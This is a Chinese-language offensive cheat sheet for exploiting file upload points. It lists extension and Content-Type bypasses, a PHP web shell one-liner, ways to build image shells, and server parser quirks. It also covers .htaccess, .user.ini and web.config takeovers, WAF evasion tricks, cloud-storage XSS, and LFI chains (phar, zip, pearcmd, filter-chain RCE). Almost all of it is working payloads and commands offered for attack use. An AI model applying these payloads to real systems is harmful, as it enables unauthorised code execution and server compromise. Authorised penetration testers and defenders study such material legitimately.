# 文件上传秒杀卡 (≤50行)

## 前置指纹（选路线）
```
PHP+nginx/fpm→.user.ini | Apache→.htaccess | IIS→web.config
Java→JSP/WAR(Tomcat CVE-2024-50379: /uploads 弱校验→shell.jsp 直命令)
云存储 OSS/S3/MinIO→Content-Type override XSS
```

## 一击（黑→白→内容→解析→逻辑 依序，命中即停）
```
改后缀: .php5 .pht .phtml .phar .php7 .jspx .asp;.jpg .PHP .pHp .php. .php%20 .php::$DATA
改 Content-Type: image/jpeg + GIF89a 头 + <?php system($_GET['c']);?>
图片马: copy /b real.jpg+shell.php shell.jpg / exiftool -Comment='<?php ...;?>' real.jpg -o shell.jpg
解析漏洞: shell.jpg/1.php (nginx fix_pathinfo) / shell.php.xxx (apache) / shell.jpg/.php (IIS7)
逻辑缺陷(2025高发): 直调写入端点绕预检 / 校验源名不校验目标名 / 重定向后不exit
```

## 上传点排查
```
/upload /oss/upload /ewebeditor/ /ueditor/ /ckeditor/ /file/upload /avatar /api/upload + Swagger upload/import | 通用/编辑器/业务/API
```

## 配置文件接管（目录不可执行时）
```
.htaccess: AddType application/x-httpd-php .jpg → 传 shell.jpg 即 shell
.user.ini (nginx/fpm, 目录级300s): auto_prepend_file=shell.jpg → 同目录任意 .php 请求先包含
web.config (IIS): <add name=x path=*.jpg verb=* type=System.Web.UI.PageHandlerFactory/>
```

## WAF 解析器差异（强 WAF 时）
```
filename=shell.php; filename*=UTF-8''shell.jpg → WAF 见 jpg、后端见 php (Codegate 2024)
垃圾填充超 8KB 扫描窗 / Transfer-Encoding: chunked / 多文件浅检(第二个删 Content-Type)
```

## 云存储 (OSS/S3/MinIO, 2025 高发)
```
GET /uploads/x.html?response-content-type=text/html → 同源渲染 → 存储型 XSS (HITCON ZD-2025-01563) ; 桶根列目录→S3Scanner
```

## 联合利用（上传+LFI 双链）
```
上传目录不可执行 → 图片马 + LFI include 触发
phar:// 反序列化 (phar.readonly=Off) / zip://uploads/x.zip%23shell
pearcmd: ?file=.../pearcmd.php&+config-create+/<?php system($_GET[1]);?>+/tmp/s.php ; 被拦→peclcmd.php 影子入口(不在黑名单)
filter chain 无文件 RCE: python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
```

→ 返回 S2: {落盘路径?, 可执行?, 配置可接管?, 含包含点?}
